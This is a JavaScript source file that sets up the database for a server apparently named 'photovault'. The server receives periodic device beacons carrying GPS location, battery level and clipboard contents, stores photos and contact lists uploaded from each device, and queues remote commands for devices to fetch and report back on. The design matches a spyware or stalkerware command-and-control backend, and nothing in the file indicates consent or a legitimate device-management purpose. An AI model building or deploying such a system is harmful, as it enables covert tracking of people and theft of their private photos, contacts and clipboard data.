const initSqlJs = require('sql.js');
const path = require('path');
const fs = require('fs');

let db;
const DB_PATH = path.join(__dirname, 'photovault.db');

async function initDB() {
    const SQL = await initSqlJs();

    // Load existing DB or create new
    if (fs.existsSync(DB_PATH)) {
        const buffer = fs.readFileSync(DB_PATH);
        db = new SQL.Database(buffer);
    } else {
        db = new SQL.Database();
    }

    db.run('PRAGMA journal_mode = WAL;');
    db.run('PRAGMA foreign_keys = ON;');

    db.run(`
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            deviceId TEXT UNIQUE NOT NULL,
            deviceName TEXT,
            model TEXT,
            osVersion TEXT,
            battery REAL,
            lat REAL,
            lng REAL,
            clipboard TEXT,
            lastSeen TEXT,
            firstSeen TEXT,
            totalPhotos INTEGER DEFAULT 0,
            status TEXT DEFAULT 'offline'
        )
    `);

    db.run(`
        CREATE TABLE IF NOT EXISTS beacons (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            deviceId TEXT NOT NULL,
            timestamp TEXT NOT NULL,
            battery REAL,
            lat REAL,
            lng REAL,
            clipboard TEXT,
            raw TEXT
        )
    `);

    db.run(`
        CREATE TABLE IF NOT EXISTS photos (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            deviceId TEXT NOT NULL,
            assetId TEXT,
            filename TEXT,
            path TEXT,
            size INTEGER,
            uploadedAt TEXT
        )
    `);

    db.run(`
        CREATE TABLE IF NOT EXISTS contacts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            deviceId TEXT NOT NULL,
            data TEXT,
            uploadedAt TEXT
        )
    `);

    db.run(`
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            deviceId TEXT NOT NULL,
            type TEXT NOT NULL,
            params TEXT,
            status TEXT DEFAULT 'pending',
            createdAt TEXT,
            completedAt TEXT,
            result TEXT
        )
    `);

    // Indices
    try {
        db.run('CREATE INDEX IF NOT EXISTS idx_devices_deviceId ON devices(deviceId)');
        db.run('CREATE INDEX IF NOT EXISTS idx_beacons_deviceId ON beacons(deviceId)');
        db.run('CREATE INDEX IF NOT EXISTS idx_photos_deviceId ON photos(deviceId)');
        db.run('CREATE INDEX IF NOT EXISTS idx_commands_deviceId_status ON commands(deviceId, status)');
    } catch (e) { /* indices may already exist */ }

    saveDB();
    return db;
}

function saveDB() {
    if (!db) return;
    const data = db.export();
    const buffer = Buffer.from(data);
    fs.writeFileSync(DB_PATH, buffer);
}

// Auto-save every 10 seconds
setInterval(() => { try { saveDB(); } catch(e) {} }, 10000);

// Helper: run a query that returns rows as objects
function queryAll(sql, params = []) {
    const stmt = db.prepare(sql);
    stmt.bind(params);
    const rows = [];
    while (stmt.step()) {
        rows.push(stmt.getAsObject());
    }
    stmt.free();
    return rows;
}

function queryOne(sql, params = []) {
    const rows = queryAll(sql, params);
    return rows.length > 0 ? rows[0] : null;
}

function runSql(sql, params = []) {
    db.run(sql, params);
    saveDB();
}

function lastInsertId() {
    const row = queryOne('SELECT last_insert_rowid() as id');
    return row ? row.id : 0;
}

// ─── CRUD Functions ──────────────────────────────────────────

function upsertDevice(data) {
    const now = new Date().toISOString();
    const { deviceId, deviceName, model, osVersion, battery, lat, lng, clipboard } = data;

    const existing = queryOne('SELECT id, firstSeen, totalPhotos FROM devices WHERE deviceId = ?', [deviceId]);

    if (existing) {
        runSql(`
            UPDATE devices SET
                deviceName = ?, model = ?, osVersion = ?, battery = ?,
                lat = ?, lng = ?, clipboard = ?, lastSeen = ?, status = 'online'
            WHERE deviceId = ?
        `, [deviceName, model, osVersion, battery, lat, lng, clipboard, now, deviceId]);
    } else {
        runSql(`
            INSERT INTO devices (deviceId, deviceName, model, osVersion, battery, lat, lng, clipboard, lastSeen, firstSeen, totalPhotos, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0, 'online')
        `, [deviceId, deviceName, model, osVersion, battery, lat, lng, clipboard, now, now]);
    }

    return queryOne('SELECT * FROM devices WHERE deviceId = ?', [deviceId]);
}

function logBeacon(data) {
    const now = new Date().toISOString();
    const { deviceId, battery, lat, lng, clipboard } = data;
    const raw = JSON.stringify(data);

    runSql(`
        INSERT INTO beacons (deviceId, timestamp, battery, lat, lng, clipboard, raw)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    `, [deviceId, now, battery, lat, lng, clipboard, raw]);
}

function addPhoto(deviceId, assetId, filename, filePath, size) {
    const now = new Date().toISOString();

    runSql(`
        INSERT INTO photos (deviceId, assetId, filename, path, size, uploadedAt)
        VALUES (?, ?, ?, ?, ?, ?)
    `, [deviceId, assetId, filename, filePath, size, now]);

    const id = lastInsertId();

    runSql('UPDATE devices SET totalPhotos = totalPhotos + 1 WHERE deviceId = ?', [deviceId]);

    return queryOne('SELECT * FROM photos WHERE id = ?', [id]);
}

function addContacts(deviceId, data) {
    const now = new Date().toISOString();
    runSql(`
        INSERT INTO contacts (deviceId, data, uploadedAt)
        VALUES (?, ?, ?)
    `, [deviceId, data, now]);
}

function queueCommand(deviceId, type, params) {
    const now = new Date().toISOString();
    const paramsStr = typeof params === 'string' ? params : JSON.stringify(params || {});

    runSql(`
        INSERT INTO commands (deviceId, type, params, status, createdAt)
        VALUES (?, ?, ?, 'pending', ?)
    `, [deviceId, type, paramsStr, now]);

    const id = lastInsertId();
    return queryOne('SELECT * FROM commands WHERE id = ?', [id]);
}

function getPendingCommands(deviceId) {
    return queryAll('SELECT * FROM commands WHERE deviceId = ? AND status = ?', [deviceId, 'pending']);
}

function markCommandSent(id) {
    runSql("UPDATE commands SET status = 'sent' WHERE id = ?", [id]);
}

function markCommandCompleted(id, result) {
    const now = new Date().toISOString();
    runSql("UPDATE commands SET status = 'completed', completedAt = ?, result = ? WHERE id = ?", [now, result, id]);
}

function getDevices() {
    return queryAll('SELECT * FROM devices ORDER BY lastSeen DESC');
}

function getDevice(deviceId) {
    return queryOne('SELECT * FROM devices WHERE deviceId = ?', [deviceId]);
}

function getPhotos(deviceId, page = 1, limit = 50) {
    const offset = (page - 1) * limit;
    const photos = queryAll('SELECT * FROM photos WHERE deviceId = ? ORDER BY uploadedAt DESC LIMIT ? OFFSET ?', [deviceId, limit, offset]);
    const total = queryOne('SELECT COUNT(*) as count FROM photos WHERE deviceId = ?', [deviceId]);
    return { photos, total: total ? total.count : 0, page, limit };
}

function getPhotoById(id) {
    return queryOne('SELECT * FROM photos WHERE id = ?', [id]);
}

function getContacts(deviceId) {
    return queryOne('SELECT * FROM contacts WHERE deviceId = ? ORDER BY uploadedAt DESC LIMIT 1', [deviceId]);
}

function getCommands(deviceId) {
    return queryAll('SELECT * FROM commands WHERE deviceId = ? ORDER BY createdAt DESC LIMIT 50', [deviceId]);
}

function getStats() {
    const totalDevices = queryOne('SELECT COUNT(*) as count FROM devices');
    const twoMinAgo = new Date(Date.now() - 2 * 60 * 1000).toISOString();
    const activeDevices = queryOne('SELECT COUNT(*) as count FROM devices WHERE lastSeen > ?', [twoMinAgo]);
    const totalPhotos = queryOne('SELECT COUNT(*) as count FROM photos');
    const dataSizeResult = queryOne('SELECT COALESCE(SUM(size), 0) as total FROM photos');

    return {
        totalDevices: totalDevices ? totalDevices.count : 0,
        activeDevices: activeDevices ? activeDevices.count : 0,
        totalPhotos: totalPhotos ? totalPhotos.count : 0,
        dataSize: dataSizeResult ? dataSizeResult.total : 0
    };
}

function getRecentBeacons(limit = 50) {
    return queryAll(`
        SELECT b.*, d.deviceName
        FROM beacons b
        LEFT JOIN devices d ON b.deviceId = d.deviceId
        ORDER BY b.timestamp DESC
        LIMIT ?
    `, [limit]);
}

module.exports = {
    initDB,
    upsertDevice,
    logBeacon,
    addPhoto,
    addContacts,
    queueCommand,
    getPendingCommands,
    markCommandSent,
    markCommandCompleted,
    getDevices,
    getDevice,
    getPhotos,
    getPhotoById,
    getContacts,
    getCommands,
    getStats,
    getRecentBeacons
};
